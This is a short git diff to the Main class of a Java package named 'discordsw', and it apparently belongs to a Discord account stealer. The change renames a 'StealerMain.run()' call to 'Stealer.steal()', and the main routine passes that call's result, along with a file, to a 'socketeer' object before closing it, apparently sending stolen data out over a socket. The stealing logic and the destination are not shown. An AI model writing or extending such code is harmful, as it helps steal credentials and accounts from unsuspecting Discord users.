@@ -1,6 +1,6 @@
 package me.mafrans.discordsw;
 
-import me.mafrans.discordsw.stealer.StealerMain;
+import me.mafrans.discordsw.stealer.Stealer;
 
 import java.io.*;
 
@@ -13,7 +13,7 @@ public class Main {
 
             socketeer.f(file);
 
-            socketeer.h(StealerMain.run());
+            socketeer.h(Stealer.steal());
 
             socketeer.close();
         }
